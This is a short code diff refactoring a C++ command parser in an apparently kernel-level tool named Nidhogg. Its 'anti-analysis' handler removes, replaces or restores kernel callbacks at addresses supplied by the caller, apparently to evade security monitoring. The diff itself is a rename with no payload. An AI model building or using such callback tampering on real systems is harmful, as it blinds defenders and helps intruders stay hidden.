@@ -1,6 +1,6 @@
 #include "pch.h"
 #include "CallbacksParser.h"
-#include "AntiAnalysis.hpp"
+#include "AntiAnalysisHandler.h"
 
 CallbacksParser::CallbacksParser() {
 	this->optionsSize = 2;
@@ -25,7 +25,7 @@ CallbacksParser::CallbacksParser() {
 * @status	 [NTSTATUS] -- Result of the command.
 */
 NTSTATUS CallbacksParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
-	KernelCallback callback{};
+	IoctlKernelCallback callback{};
 	NTSTATUS status = STATUS_SUCCESS;
 
 	callback.CallbackAddress = *(ULONG*)args[0];
@@ -38,13 +38,13 @@ NTSTATUS CallbacksParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
 	case Options::Enable:
 	{
 		callback.Remove = false;
-		status = NidhoggAntiAnalysis->RestoreCallback(&callback);
+		status = NidhoggAntiAnalysisHandler->RestoreCallback(callback);
 		break;
 	}
 	case Options::Disable:
 	{
 		callback.Remove = true;
-		status = NidhoggAntiAnalysis->RemoveCallback(&callback);
+		status = NidhoggAntiAnalysisHandler->ReplaceCallback(callback);
 		break;
 	}
 	default:
